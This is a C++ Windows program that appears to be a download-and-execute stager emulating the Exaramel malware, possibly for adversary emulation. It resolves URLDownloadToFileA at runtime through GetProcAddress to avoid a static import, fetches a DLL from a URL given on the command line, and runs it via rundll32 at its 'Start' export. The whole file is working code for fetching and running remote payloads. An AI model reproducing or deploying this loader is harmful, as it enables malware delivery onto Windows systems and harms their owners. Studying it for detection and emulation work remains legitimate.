#include <iostream>
#include <Windows.h>
#include <string>

using namespace std;

typedef HRESULT(WINAPI *URLDownloadToFile_dynamic_load)(LPUNKNOWN, LPCTSTR, LPCTSTR, DWORD, LPBINDSTATUSCALLBACK);

// note: this program does not work with self-signed certificates unless you import the certificate first on the target system
int main(int argc, char *argv[])
{
    // process command line arguments
    if (argc != 3)
    {
        cout << "[-] Not enough arguments.\n";
        cout << "[i] Usage: " << argv[0] << "<url> <filepath>\n";
        cout << "[i] Example: " << argv[0] << " http://192.168.0.4/file.exe C:\\Users\\Public\\file.exe\n";
        exit(EXIT_FAILURE);
    }

    // initialize variables
    char *url = argv[1];
    char *dll_save_path = argv[2];
    string the_dll = dll_save_path;
    string exec_dll = "rundll32.exe " + the_dll + ",Start";

    string lib_urlmon = "Urlmon.dll";
    HMODULE handle_to_lib_urlmon = NULL;

    string function_to_load = "URLDownloadToFileA";
    FARPROC address_of_URLDownloadToFile = NULL;
    URLDownloadToFile_dynamic_load pointer_to_URLDownloadToFile = NULL;

    HRESULT download_result = 0;

    // Load urlmon.dll
    cout << "[i] Loading urlmon.dll via LoadLibraryExA()\n";
    handle_to_lib_urlmon = LoadLibraryExA(lib_urlmon.c_str(), NULL, LOAD_LIBRARY_SEARCH_DEFAULT_DIRS);
    if (handle_to_lib_urlmon == NULL)
    {
        cerr << "[-] Failed to load urlmon.dll\n";
        exit(EXIT_FAILURE);
    }

    // resolve address of URLDownloadToFile
    cout << "[i] Resolving address of URLDownloadToFile via GetProcAddress()\n";
    pointer_to_URLDownloadToFile = (URLDownloadToFile_dynamic_load)GetProcAddress(handle_to_lib_urlmon, function_to_load.c_str());
    if (pointer_to_URLDownloadToFile == NULL)
    {
        cerr << "[-] Failed to resolve address of URLDownloadToFile\n";
        cerr << "    See error: " << GetLastError() << "\n";
        exit(EXIT_FAILURE);
    }

    // download file to disk
    cout << "[i] Downloading file: " << url << " via URLDownloadToFileA\n";
    download_result = pointer_to_URLDownloadToFile(NULL, url, dll_save_path, 0, NULL);
    if (download_result != S_OK)
    {
        cerr << "[-] Failed during call to URLDownloadToFile\n";
        cerr << "    See error: " << GetLastError() << "\n";
        exit(EXIT_FAILURE);
    }

    // free Urlmon.dll
    cout << "[i] Freeing Urlmon.dll via FreeLibrary()\n";
    FreeLibrary(handle_to_lib_urlmon);

    // execute DLL
    cout << "[i] invoking Exaramel DLL via:\n    " << exec_dll << "\n";
    system(exec_dll.c_str());

    return EXIT_SUCCESS;
}